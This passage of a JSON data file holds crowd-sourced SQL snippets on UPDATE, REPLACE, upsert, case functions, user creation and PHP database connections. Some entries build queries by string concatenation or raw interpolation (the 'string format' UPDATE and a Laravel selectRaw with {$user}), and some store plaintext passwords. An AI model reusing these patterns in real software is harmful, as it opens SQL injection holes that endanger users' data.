    "description": "REPLACE(str, find_string, replace_with) \n#Search, Update & Replace Query  UPDATE `tblname` SET `description`= REPLACE(`description`, 'old name', 'New Name') WHERE `description` LIKE '%old name%';\nThe MySQL REPLACE statement is an extension to the SQL Standard. The MySQL REPLACE statement works as follows:  Step 1. Insert a new row into the table, if a duplicate key error occurs.  Step 2. If the insertion fails due to a duplicate-key error occurs:  Delete the conflicting row that causes the duplicate key error from the table. Insert the new row into the table again. To determine whether the new row that already exists in the table, MySQL uses PRIMARY KEY or UNIQUE KEY index. If the table does not have one of these indexes, the REPLACE works like an  INSERT statement.  To use the REPLACE statement, you need to have at least both INSERT and DELETE privileges for the table.  Notice that MySQL has the REPLACE string function which is not the REPLACE statement covered in this tutorial.  The following illustrates the syntax of the REPLACE statement:  REPLACE [INTO] table_name(column_list) VALUES(value_list);\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4576,
    "keyword": null,
    "link": null,
    "title": " update cell postgres",
    "description": "UPDATE table SET column1 = value1,     column2 = value2 ,... WHERE \tcondition;\nUPDATE table_name SET column1 = value1,     column2 = value2,     ... WHERE condition;\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4577,
    "keyword": null,
    "link": null,
    "title": " update column data type postgres",
    "description": "                                     ALTER TABLE assets ALTER COLUMN name TYPE VARCHAR; \nALTER TABLE table_name ALTER COLUMN column_name [SET DATA] TYPE new_data_type;   \n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4578,
    "keyword": null,
    "link": null,
    "title": " update foreign key value in mysql",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nSET foreign_key_checks = 0; UPDATE languages SET id='xyz' WHERE id='abc'; UPDATE categories_languages SET language_id='xyz' WHERE language_id='abc'; SET foreign_key_checks = 1;\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4579,
    "keyword": null,
    "link": null,
    "title": " update from select join",
    "description": "   UPDATE         first_table ft         JOIN second_table st ON st.some_id = ft.some_id         JOIN third_table tt  ON tt.some_id = st.some_id         .....     SET         ft.some_column = some_value     WHERE ft.some_column = 123456 AND st.some_column = 123456 \nUPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T10:01:22.000Z"
  },
  {
    "id": 4580,
    "keyword": null,
    "link": null,
    "title": " update from select oracle",
    "description": "UPDATE mytable t\t\t-- Update using WITH statement SET value3 = (     WITH comp AS (         SELECT id, value1         FROM mytable t         WHERE value2 > 10     )     SELECT c.value1     FROM comp c     WHERE c.id = t.id );\nUPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4581,
    "keyword": null,
    "link": null,
    "title": " update from select sqlite",
    "description": "UPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\nUPDATE table SET column_1 = new_value_1,     column_2 = new_value_2 WHERE     search_condition  ORDER column_or_expression LIMIT row_count OFFSET offset;\nUPDATE employees SET hire_date = (SELECT departments.start_date                  FROM departments                  WHERE departments.department_id = employees.department_id                  AND departments.department_name = 'HR') WHERE EXISTS (SELECT *               FROM departments               WHERE departments.department_id = employees.department_id               AND departments.department_name ='HR');\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4582,
    "keyword": null,
    "link": null,
    "title": " update from table tsql",
    "description": "UPDATE table1 SET table1.column = table2.column FROM Table1 table1  INNER JOIN Table2 table2 ON table1.id = table2.id;\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4583,
    "keyword": null,
    "link": null,
    "title": " update in sql",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition\nUPDATE table_name SET column1 = value1, column2 = value2...., columnN = valueN WHERE [condition]; \nMit UPATE werden  Datenwerte in der Datenbank aktualisiert. Nach Bed&uuml;rfnis k&ouml;nnen auch mehrere Datens&auml;tze auf einmal ver&auml;ndert werden. Mit WHERE werden nur bestimmte Datens&auml;tze zu aktualisiert.    UPDATE suppliers       SET supplier_id = 50,       supplier_name = 'Apple',       city = 'Cupertino'   WHERE       supplier_name = 'Google'; \n-- sql update using string format  String = \"UPDATE yourtable SET yourcolumn = '\" + yourvealueintext + \"' WHERE column = \" + item_to_compare_the_position_of_Your_Column;                                            -- or                                             String = \"UPDATE yourtable SET yourcolumn = \" + yourvalue_in_number + \" WHERE column = \" + item_to_compare_the_position_of_Your_Column;\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4584,
    "keyword": null,
    "link": null,
    "title": " update left join mysql",
    "description": "UPDATE  t1 LEFT JOIN         t2 ON      t2.id = t1.id SET     t1.col1 = newvalue WHERE   t2.id IS NULL\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4585,
    "keyword": null,
    "link": null,
    "title": " update mongodb version ubuntu",
    "description": "sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 656408E390CFB1F5 \necho \"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.4 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb.list \nmongodb-org is already the newest version (4.0.10). \n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4586,
    "keyword": null,
    "link": null,
    "title": " update multiple columns in sql",
    "description": "-- Oracle UPDATE table2 t2 SET (VALUE1, VALUE2) =      (SELECT COL1 AS VALUE1, COL1 AS VALUE2 FROM table1 t1 WHERE t1.ID = t2.ID); -- SQL Server UPDATE table2 t2 SET     t2.VALUE1 = t1.COL1,     t2.VALUE2 = t1.COL2 FROM table1 t1 INNER JOIN t2 ON t1.ID = t2.ID; -- MySQL UPDATE table2 t2 INNER JOIN table1 t1 USING (ID) SET T2.VALUE1 = t1.COL1, t2.VALUE2 = t1.COL2;\nUPDATE table-name SET column-name = value, column-name = value WHERE condition = value\nUPDATE Person.Person  Set FirstName = 'Kenneth'     ,LastName =  'Smith'  WHERE BusinessEntityID = 1\n-- CANT do multiple sets but can do case UPDATE table SET ID = CASE WHEN ID = 2555 THEN 111111259                WHEN ID = 2724 THEN 111111261               WHEN ID = 2021 THEN 111111263               WHEN ID = 2017 THEN 111111264          END WHERE ID IN (2555,2724,2021,2017) \n/*You can't update multiple tables in one statement, however, you can use a transaction to make sure that two UPDATE statements are treated atomically. You can also batch them to avoid a round trip.*/   BEGIN TRANSACTION;  UPDATE Table1   SET Table1.LastName = 'DR. XXXXXX'  FROM Table1 T1, Table2 T2 WHERE T1.id = T2.id and T1.id = '011008';  UPDATE Table2 SET Table2.WAprrs = 'start,stop' FROM Table1 T1, Table2 T2 WHERE T1.id = T2.id and T1.id = '011008';  COMMIT; \n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4587,
    "keyword": null,
    "link": null,
    "title": " update mysql centos",
    "description": "# WARNING: Backup before you do this as it will delete all your databases wget http://repo.mysql.com/mysql57-community-release-el7.rpm -P /tmp/ yum remove mysql-community-release rpm -ivh /tmp/mysql57-community-release-el7.rpm yum update mysql sudo systemctl start mysqld sudo systemctl status mysqld sudo mysql_upgrade sudo systemctl restart mysqld sudo systemctl status mysqld\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4588,
    "keyword": null,
    "link": null,
    "title": " update oracle",
    "description": "UPDATE T_NAME SET PARAM_1=23, PARAM_2=true WHERE PARAM_7= 'something'\nUPDATE mytable t\t\t-- Update using WITH statement SET value3 = (     WITH comp AS (         SELECT id, value1         FROM mytable t         WHERE value2 > 10     )     SELECT c.value1     FROM comp c     WHERE c.id = t.id );\nUPDATE table SET column1 = expression1,     column2 = expression2,     ...     column_n = expression_n [WHERE conditions];\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4589,
    "keyword": null,
    "link": null,
    "title": " update part of a string in mysql",
    "description": "UPDATE table SET field = REPLACE(field, 'string', 'anothervalue') WHERE field LIKE '%string%';\nSELECT Country, REPLACE(Country, 'States', 'Kingdom')  FROM Persons;  UPDATE tableName SET Country = REPLACE(Country, 'States', 'Kingdom')  -- if Country = 'United States' -- After replace = 'United Kingdom'\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4590,
    "keyword": null,
    "link": null,
    "title": " update query for multiple columns",
    "description": "-- Oracle UPDATE table2 t2 SET (VALUE1, VALUE2) =      (SELECT COL1 AS VALUE1, COL1 AS VALUE2 FROM table1 t1 WHERE t1.ID = t2.ID); -- SQL Server UPDATE table2 t2 SET     t2.VALUE1 = t1.COL1,     t2.VALUE2 = t1.COL2 FROM table1 t1 INNER JOIN t2 ON t1.ID = t2.ID; -- MySQL UPDATE table2 t2 INNER JOIN table1 t1 USING (ID) SET T2.VALUE1 = t1.COL1, t2.VALUE2 = t1.COL2;\nUPDATE table-name SET column-name = value, column-name = value WHERE condition = value\nUPDATE Person.Person  Set FirstName = 'Kenneth'     ,LastName =  'Smith'  WHERE BusinessEntityID = 1\n",
    "reg_date": "2021-10-12T10:01:23.000Z"
  },
  {
    "id": 4591,
    "keyword": null,
    "link": null,
    "title": " update query in mysql",
    "description": "UPDATE table_name SET variable = 'changed field', variable = 'another changed field' WHERE firstline_name = 1;\nUPDATE table_name SET field1 = 'value 1', field2 = 'value 2' WHERE field3 = 'value 3' \n-- Set New Employee Password  UPDATE employee SET employee.password = '1234' WHERE employee.email = 'emp@gmail.com';\nUPDATE tableName SET anAttribute = 'Something' WHERE anOtherAttribute = 'SomethingElse'  //All 'SomethingElse' values will become 'Something'\nUPDATE [LOW_PRIORITY] [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE     condition];\nALTER TABLE t1 MODIFY post_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP \n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4592,
    "keyword": null,
    "link": null,
    "title": " update record in postgreps",
    "description": "UPDATE table_name SET column1 = value1,     column2 = value2,     ... WHERE condition;\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4593,
    "keyword": null,
    "link": null,
    "title": " update set mysql",
    "description": "-- Set New Employee Password  UPDATE employee SET employee.password = '1234' WHERE employee.email = 'emp@gmail.com';\nUPDATE tableName SET anAttribute = 'Something' WHERE anOtherAttribute = 'SomethingElse'  //All 'SomethingElse' values will become 'Something'\n-- Things in brackets are optional -- IGNORE modifier updates rows even if errors occur (ie: the rows that cause errors are simply not updated) UPDATE [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE      condition]; -- WHERE tells us which rows to update based on said condition\nThe UPDATE statement updates data in a table. It allows you to change the values in one or more columns of a single row or multiple rows.  The following illustrates the basic syntax of the UPDATE statement:  UPDATE [LOW_PRIORITY] [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE     condition]; In this syntax:  First, specify the name of the table that you want to update data after the UPDATE keyword. Second, specify which column you want to update and the new value in the SET clause. To update values in multiple columns, you use a list of comma-separated assignments by supplying a value in each column&rsquo;s assignment in the form of a literal value, an expression, or a subquery. Third, specify which rows to be updated using a condition in the WHERE clause. The WHERE clause is optional. If you omit it, the UPDATE statement will modify all rows in the table.\nUPDATE table_name SET field1 = new-value1, field2 = new-value2 [WHERE Clause] \n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4594,
    "keyword": null,
    "link": null,
    "title": " update sql",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \n# SQL Server UPDATE     Sales_Import SET     Sales_Import.AccountNumber = RAN.AccountNumber FROM     Sales_Import SI INNER JOIN     RetrieveAccountNumber RAN ON      SI.LeadID = RAN.LeadID; # MySQL & MariaDB UPDATE     Sales_Import SI,     RetrieveAccountNumber RAN SET     SI.AccountNumber = RAN.AccountNumber WHERE     SI.LeadID = RAN.LeadID;\nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition\nUPDATE table SET nom_colonne_1 = 'nouvelle valeur' WHERE condition\n-- sql update using string format  String = \"UPDATE yourtable SET yourcolumn = '\" + yourvealueintext + \"' WHERE column = \" + item_to_compare_the_position_of_Your_Column;                                            -- or                                             String = \"UPDATE yourtable SET yourcolumn = \" + yourvalue_in_number + \" WHERE column = \" + item_to_compare_the_position_of_Your_Column;\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4595,
    "keyword": null,
    "link": null,
    "title": " update sql sintax",
    "description": "-- from w3schools UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition; \n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4596,
    "keyword": null,
    "link": null,
    "title": " update sql user password",
    "description": "-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4597,
    "keyword": null,
    "link": null,
    "title": " update sqlite3 data python",
    "description": "UPDATE ExampleTable SET Age = 18 WHERE Age = 17\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4598,
    "keyword": null,
    "link": null,
    "title": " update substring in mysql",
    "description": "SELECT Country, REPLACE(Country, 'States', 'Kingdom')  FROM Persons;  UPDATE tableName SET Country = REPLACE(Country, 'States', 'Kingdom')  -- if Country = 'United States' -- After replace = 'United Kingdom'\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4599,
    "keyword": null,
    "link": null,
    "title": " update table from another table mysql",
    "description": "UPDATE  t1 LEFT JOIN         t2 ON      t2.id = t1.id SET     t1.col1 = newvalue WHERE   t2.id IS NULL\nUPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\nUPDATE tableB INNER JOIN tableA ON tableB.name = tableA.name SET tableB.value = IF(tableA.value > 0, tableA.value, tableB.value) WHERE tableA.name = 'Joe' \nUPDATE TableB  SET TableB.value = (     SELECT TableA.value      FROM TableA     WHERE TableA.name = TableB.name );\nUPDATE MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.COLID SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4600,
    "keyword": null,
    "link": null,
    "title": " update table from another table oracle",
    "description": "UPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T10:01:24.000Z"
  },
  {
    "id": 4601,
    "keyword": null,
    "link": null,
    "title": " update table mysql",
    "description": "UPDATE table_name SET variable = 'changed field', variable = 'another changed field' WHERE firstline_name = 1;\nUPDATE table_name SET field1 = 'value 1', field2 = 'value 2' WHERE field3 = 'value 3' \nUPDATE tableName SET columnName = yourValue; #to update multiple columns: UPDATE tableName SET column1 = value1, column2 = value2; #and so on\n-- Set New Employee Password  UPDATE employee SET employee.password = '1234' WHERE employee.email = 'emp@gmail.com';\nUPDATE tableName SET anAttribute = 'Something' WHERE anOtherAttribute = 'SomethingElse'  //All 'SomethingElse' values will become 'Something'\n-- Things in brackets are optional -- IGNORE modifier updates rows even if errors occur (ie: the rows that cause errors are simply not updated) UPDATE [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE      condition]; -- WHERE tells us which rows to update based on said condition\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4602,
    "keyword": null,
    "link": null,
    "title": " update table sql multiple set",
    "description": "-- CANT do multiple sets but can do case UPDATE table SET ID = CASE WHEN ID = 2555 THEN 111111259                WHEN ID = 2724 THEN 111111261               WHEN ID = 2021 THEN 111111263               WHEN ID = 2017 THEN 111111264          END WHERE ID IN (2555,2724,2021,2017) \n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4603,
    "keyword": null,
    "link": null,
    "title": " update table syntax in oracle",
    "description": "UPDATE T_NAME SET PARAM_1=23, PARAM_2=true WHERE PARAM_7= 'something'\n{     UPDATE table-Name [[AS] correlation-Name]         SET column-Name = Value         [ , column-Name = Value} ]*         [WHERE clause] |     UPDATE table-Name         SET column-Name = Value         [ , column-Name = Value ]*         WHERE CURRENT OF }\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4604,
    "keyword": null,
    "link": null,
    "title": " update top 100 sql",
    "description": "update top (100) table1 set field1 = 1\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4605,
    "keyword": null,
    "link": null,
    "title": " update using case in mysql",
    "description": "UPDATE `table` SET `uid` = CASE     WHEN id = 1 THEN 2952     WHEN id = 2 THEN 4925     WHEN id = 3 THEN 1592     ELSE `uid`     END WHERE id  in (1,2,3)\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4606,
    "keyword": null,
    "link": null,
    "title": " update value postgresql",
    "description": "UPDATE table SET column1 = value1,     column2 = value2 ,... WHERE \tcondition;\nUPDATE table_name SET column1 = value1,     column2 = value2,     ... WHERE condition;\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4607,
    "keyword": null,
    "link": null,
    "title": " update with inner join",
    "description": "UPDATE tb1 SET tb1.column_1 = tb2.column_1 FROM table_1 AS tb1 INNER JOIN table_2 AS tb2 ON tb1.column_2 = tb2.column_3\nUPDATE      t1 SET      t1.c1 = t2.c2,     t1.c2 = expression,     ...    FROM      t1     [INNER | LEFT] JOIN t2 ON join_predicate WHERE      where_predicate; \n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4608,
    "keyword": null,
    "link": null,
    "title": " update with inner join postgres",
    "description": "update xtable x  set col1 = y.col1 from ytable y  where y.x_id = x.id;\nUPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition \nselect * from tableA a join      tableB b      on a.id like '%' + b.id + '%';\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4609,
    "keyword": null,
    "link": null,
    "title": " update with join",
    "description": "UPDATE A SET foo = B.bar FROM TableA A JOIN TableB B     ON A.col1 = B.colx WHERE ...\nUPDATE      t1 SET      t1.c1 = t2.c2,     t1.c2 = expression,     ...    FROM      t1     [INNER | LEFT] JOIN t2 ON join_predicate WHERE      where_predicate; \n   UPDATE         first_table ft         JOIN second_table st ON st.some_id = ft.some_id         JOIN third_table tt  ON tt.some_id = st.some_id         .....     SET         ft.some_column = some_value     WHERE ft.some_column = 123456 AND st.some_column = 123456 \nUPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\nupdate a join b  on a.a_id=b.b_id  set b.is_active = 1  where ....;\nUPDATE D SET D.Name = 'Computer Science and Engineering' FROM Department D INNER JOIN Student S ON D.Id = S.DepartmentId\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4610,
    "keyword": null,
    "link": null,
    "title": " update with join sql server",
    "description": "     UPDATE      t1 SET      t1.c1 = t2.c2,     t1.c2 = expression,     ...    FROM      t1     [INNER | LEFT] JOIN t2 ON join_predicate WHERE      where_predicate;\nUPDATE A SET foo = B.bar FROM TableA A JOIN TableB B     ON A.col1 = B.colx WHERE ...\nUPDATE      t1 SET      t1.c1 = t2.c2,     t1.c2 = expression,     ...    FROM      t1     [INNER | LEFT] JOIN t2 ON join_predicate WHERE      where_predicate; \n   UPDATE         first_table ft         JOIN second_table st ON st.some_id = ft.some_id         JOIN third_table tt  ON tt.some_id = st.some_id         .....     SET         ft.some_column = some_value     WHERE ft.some_column = 123456 AND st.some_column = 123456 \nUPDATE D SET D.Name = 'Computer Science and Engineering' FROM Department D INNER JOIN Student S ON D.Id = S.DepartmentId\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4611,
    "keyword": null,
    "link": null,
    "title": " updated row plsql",
    "description": "YOU SHOULD USE       SQL%rowcount           HERE IS AN EXAMPLE  set serveroutput ON;  DECLARE      i NUMBER;  BEGIN      UPDATE employees      SET    status = 'fired'      WHERE  name LIKE '%Bloggs';      i := SQL%rowcount;      --note that assignment has to precede COMMIT     COMMIT;      dbms_output.Put_line(i);  END; \n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4612,
    "keyword": null,
    "link": null,
    "title": " updating values in sql",
    "description": "//to update value  UPDATE students SET course_id = 102 WHERE last_name = 'Jones'; ->                   if there is no condition it will update all!\nUpdates existing data in a table. Example: Updates the mileage and serviceDue values for a vehicle with an id of 45 in the cars table. UPDATE cars SET mileage = 23500, serviceDue = 0 WHERE id = 45;\n",
    "reg_date": "2021-10-12T10:01:25.000Z"
  },
  {
    "id": 4613,
    "keyword": null,
    "link": null,
    "title": " upload database mysql command line",
    "description": "mysql -u username -p database_name < file.sql   Note-1: It is better to use the full path of the SQL file file.sql.\n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\nmysql>create database yourDatabaseName; mysql>use yourDatabaseName;\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4614,
    "keyword": null,
    "link": null,
    "title": " upper and lower in oracle sql",
    "description": "SELECT upper('Hello World') FROM dual;\t\t\t\t\t-- HELLO WORLD SELECT lower('Hello World') FROM dual;\t\t\t\t\t-- hello world SELECT inticap('hello world') FROM DUAL; \t\t\t\t-- Hello World\nSELECT * FROM my_table WHERE upper(MY_COLUMN) = upper('My_String');\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4615,
    "keyword": null,
    "link": null,
    "title": " upper case sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4616,
    "keyword": null,
    "link": null,
    "title": " uppercase and lowercase in sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4617,
    "keyword": null,
    "link": null,
    "title": " uppercase sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4618,
    "keyword": null,
    "link": null,
    "title": " upsert postgres",
    "description": "INSERT INTO table_name(column_list) VALUES(value_list) ON CONFLICT target [DO NOTHING]  -- or       INSERT INTO table_name(column_list) VALUES(value_list) ON CONFLICT target DO UPDATE SET column_1 = value_1, .. WHERE condition]\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4619,
    "keyword": null,
    "link": null,
    "title": " use cases condition in sql query laravel",
    "description": "->selectRaw(\"shares.id AS share_id, users.id AS user_id ,      shares.connected_user_id ,           shares.original_language_id, shares.image,       users.first_name, users.last_name, users.email,       locations.city, provinces.name, countries.code,       locations.lat, locations.lng,       shares.created_at,       (CASE WHEN users.id = {$user} THEN 1 ELSE 0 END) AS is_user)\")     ->orderBy('shares.created_at', 'desc')\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4620,
    "keyword": null,
    "link": null,
    "title": " use database postgres command",
    "description": "\\c databasename;\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4621,
    "keyword": null,
    "link": null,
    "title": " use join in mysqli",
    "description": "SELECT      m.member_id,      m.name member,      c.committee_id,      c.name committee FROM     members m INNER JOIN committees c  \tON c.name = m.name;\n<?php    $dbhost = 'localhost:3306';    $dbuser = 'root';    $dbpass = '';    $dbname = 'TUTORIALS';    $conn = mysqli_connect($dbhost, $dbuser, $dbpass,$dbname);        if(! $conn ) {       die('Could not connect: ' . mysqli_error());    }    echo 'Connected successfully</br>';    $sql = 'SELECT a.id, a.name,b.id FROM tutorials_inf a,tutorials_bks b WHERE a.id = b.id';        if($result = mysqli_query($conn, $sql)) {       if(mysqli_num_rows($result) > 0) {          echo \"<table>\";          echo \"<tr>\";          echo \"<th>id</th>\";          echo \"<th>name</th>\";          echo \"<th>id</th>\";          echo \"</tr>\";                    while($row = mysqli_fetch_array($result)){             echo \"<tr>\";             echo \"<td>\" . $row['id'] . \"</td>\";             echo \"<td>\" . $row['name'] . \"</td>\"; \t\t\t\techo \"<td>\" . $row['id'] . \"</td>\";             echo \"</tr>\";          }          echo \"</table>\";          mysqli_free_result($result);       } else {          echo \"No records matching your query were found.\";       }    } else {       echo \"ERROR: Could not able to execute $sql. \" . mysqli_error($conn);    }    mysqli_close($conn); ?>\n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4622,
    "keyword": null,
    "link": null,
    "title": " use of now() in mysql",
    "description": "NOW() : It will return current date and time.   Ex: select NOW(); \t//YYYY-MM-DD HH-MM:SS  Output: 2021-09-13 15:35:41 \n",
    "reg_date": "2021-10-12T10:01:26.000Z"
  },
  {
    "id": 4623,
    "keyword": null,
    "link": null,
    "title": " user dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4624,
    "keyword": null,
    "link": null,
    "title": " user privileges postgresql information schema",
    "description": "GRANT SELECT ON ALL TABLES IN SCHEMA PUBLIC TO testuser2;\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4625,
    "keyword": null,
    "link": null,
    "title": " useradd postgres",
    "description": "# https://www.postgresql.org/docs/8.0/sql-createuser.html CREATE USER <username> WITH PASSWORD '<password>' VALID UNTIL '<date here>';\nsudo -u postgres psqlpostgres=# create database mydb;postgres=# create user myuser with encrypted password 'mypass';postgres=# grant all privileges on database mydb to myuser;\ndropuser username\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4626,
    "keyword": null,
    "link": null,
    "title": " using SQL in rails migration",
    "description": "def change   execute <<-SQL     UPDATE table1     SET column1 = \"value\"   SQL end\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4627,
    "keyword": null,
    "link": null,
    "title": " using mysqli and pdo",
    "description": "$dsn = \"mysql:host=localhost;dbname=myDatabase;charset=utf8mb4\"; $options = [   PDO::ATTR_EMULATE_PREPARES   => false, // turn off emulation mode for \"real\" prepared statements   PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, //turn on errors in the form of exceptions   PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, //make the default fetch be an associative array ]; try {   $pdo = new PDO($dsn, \"username\", \"password\", $options); } catch (Exception $e) {   error_log($e->getMessage());   exit('Something weird happened'); //something a user can understand } Copy\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4628,
